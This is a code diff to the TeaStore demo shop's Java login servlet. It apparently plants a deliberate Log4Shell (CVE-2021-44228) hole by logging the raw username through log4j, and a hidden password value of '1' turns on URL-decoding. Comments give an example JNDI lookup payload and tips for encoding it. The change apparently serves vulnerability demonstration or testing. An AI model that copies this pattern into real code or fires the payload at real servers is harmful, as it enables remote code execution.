@@ -24,6 +24,11 @@ import tools.descartes.teastore.registryclient.loadbalancers.LoadBalancerTimeout
 import tools.descartes.teastore.registryclient.rest.LoadBalancedStoreOperations;
 import tools.descartes.teastore.entities.message.SessionBlob;
 
+import java.net.URLDecoder;
+import java.nio.charset.StandardCharsets;
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
 /**
  * Servlet for handling the login actions.
  * 
@@ -32,6 +37,7 @@ import tools.descartes.teastore.entities.message.SessionBlob;
 @WebServlet("/loginAction")
 public class LoginActionServlet extends AbstractUIServlet {
 	private static final long serialVersionUID = 1L;
+	private static final Logger LOGGER = LogManager.getLogger(LoginActionServlet.class);
 
 	/**
 	 * @see HttpServlet#HttpServlet()
@@ -58,11 +64,26 @@ public class LoginActionServlet extends AbstractUIServlet {
 	protected void handlePOSTRequest(HttpServletRequest request, HttpServletResponse response)
 			throws ServletException, IOException, LoadBalancerTimeoutException {
 		boolean login = false;
+		System.out.println("logger class name is '" + LOGGER.getName());
+		
 		if (request.getParameter("username") != null && request.getParameter("password") != null) {
 			SessionBlob blob = LoadBalancedStoreOperations.login(getSessionBlob(request),
 					request.getParameter("username"), request.getParameter("password"));
 			login = (blob != null && blob.getSID() != null);
 
+			System.out.println("Logging in using " + LoginActionServlet.class.getName());
+			//This log will be generated every time we log into Teastore.  IF you pass a JNDI expression as
+			//'username' then the CVE-2021-44228 vulneratility will be exploited
+			//Ex: Use ${jndi:ldap://jv-${sys:java.version}} as 'username'
+			// Use a URL Decoder/Encoder (https://meyerweb.com/eric/tools/dencoder/) to encode
+			//the JNDI expression
+			String username = request.getParameter("username");
+			String password = request.getParameter("password");
+			if (password.equals("1")) {
+				LOGGER.info("Unencoded username: " + username);
+				username = URLDecoder.decode(username, StandardCharsets.UTF_8.name());
+			}
+			LOGGER.info("Logging in with user " + username);			
 			if (login) {
 				saveSessionBlob(blob, response);
 				if (request.getParameter("referer") != null
